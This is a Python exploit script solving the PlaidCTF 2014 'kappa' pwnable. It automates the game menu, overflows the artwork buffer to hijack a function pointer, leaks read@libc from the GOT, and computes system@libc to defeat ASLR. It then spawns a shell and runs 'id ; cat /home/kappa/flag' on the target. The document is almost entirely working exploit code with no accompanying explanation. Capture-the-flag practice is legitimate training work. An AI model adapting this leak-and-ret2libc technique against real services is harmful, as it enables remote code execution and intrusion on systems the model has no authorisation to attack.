# Plaid CTF 2014 - KAPPA [275pts]
# Download From ->
# http://shell-storm.org/repo/CTF/PlaidCTF-2014/Pwnables/kappa/
import socket
import struct
import telnetlib
import time
 
TARGET  = ("192.168.1.171", 7499)          
p       = lambda x : struct.pack("<L", x)
up      = lambda x : struct.unpack("<L", x)[0]
 
def catchKakuna(Name):
    s.send("1\n")
 
    print t.read_until("artwork\n\n")
    s.send("1\n")
 
    print t.read_until("3. Run\n")
    s.send("2\n")
 
    print t.read_until("Pokemon?\n")
    s.send(Name + "\n")
 
    print t.read_until("artwork\n\n")
 
def catchCharizard(Name):
    print "\n[*] START CATCH CHARIZARD \n"
    s.send("1\n")
    charizard = 0
 
    while charizard == 0:
        return_string = t.read_until("Option:")
        print return_string
 
        if (return_string.find("failed") >= 1):    
            print t.read_until("artwork\n\n")
            s.send("1\n")
        elif(return_string.find("Kakuna") >= 1):
            print t.read_until("3. Run\n")
            s.send("3\n")
 
            print t.read_until("artwork")
            s.send("1\n")
        else:                                   
            print t.read_until("3. Run\n")
 
            for i in range(4):
                s.send("1\n")
                print t.read_until("3. Run\n")
 
            s.send("2\n")
            s.send(Name + "\n")
 
            print t.read_until("5. Kakuna4\n\n")
            s.send("5\n")
 
            print t.read_until("artwork\n\n")
            charizard = 1
 
def changeArtwork(Select, Artwork):
    s.send("5\n")
 
    print t.read_until("\n\n")
    s.send(str(Select) + "\n")
 
    s.send(Artwork + "\n")
    print t.read_until("artwork\n\n")
 
def PwnKappa(s, t):
    pointer_read_got = 0x08048512 # Point read@got
    print_kakuna     = 0x08048766 # function for leaking!
    offset           = 0x0009B340 # read@libc - system@libc
 
    # START PWN!
    print t.read_until("artwork\n\n")
 
    for i in range(1, 5):                # Catch Kakuna * 4
        KakunaName = "Kakuna" + str(i)
        catchKakuna(KakunaName)
 
    s.send("3\n")
    print t.read_until("artwork\n\n")
 
    #STAGE ONE - LEAK THE LIBC ADDRESS
    catchCharizard("/bin/sh")        # Catch Charizard To change EIP
                                     # Charizard->name = "/bin/sh"
    payload  = "A" * 509
    payload += p(pointer_read_got)
    payload += p(print_kakuna)       # LEAK READ@LIBC FROM "ATTACK: %s"
    payload += "A" * 4000
 
    print "\n[*] CHANGE ARTWORK TO PAYLOAD!\n"
    changeArtwork(5, payload)
 
    time.sleep(1)
    s.send("3\n")
    
    for i in range(2):
        print t.read_until("Attack: Tackle\n")
 
    recv_str  = s.recv(4096 * 3)
    find_read = recv_str.find("\xB7") + 1
 
    print recv_str
 
    # STAGE TWO - EXECUTE SYSTEM@LIBC
 
    READ_LIBC   = recv_str[find_read - 4:find_read]    
    READ_LIBC   = up(READ_LIBC)
    SYSTEM_LIBC = READ_LIBC - offset
 
    print "[*] READ@LIBC   : " + hex(READ_LIBC)
    print "[*] SYSTEM@LIBC : " + hex(SYSTEM_LIBC) + "\n"
 
    payload  = "A" * 513
    payload += p(SYSTEM_LIBC)
    payload += "A" * 4000
 
    changeArtwork(5, payload)
 
    print "[*] Change Function Pointer To SYSTEM@LIBC"
 
    time.sleep(1)
    s.send("3\n")
 
    print s.recv(4096 * 2)
    print s.recv(4096 * 2)
 
    print "[*] GET FLAG! :)"
 
    s.send("id ; cat /home/kappa/flag\n")
    print "[*] " + s.recv(1024),
    print "[*] FLAG IS {" + s.recv(1024)[:-1] + "}",
 
if __name__ == "__main__":
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(TARGET)
    t = telnetlib.Telnet()
    t.sock = s
 
    PwnKappa(s, t)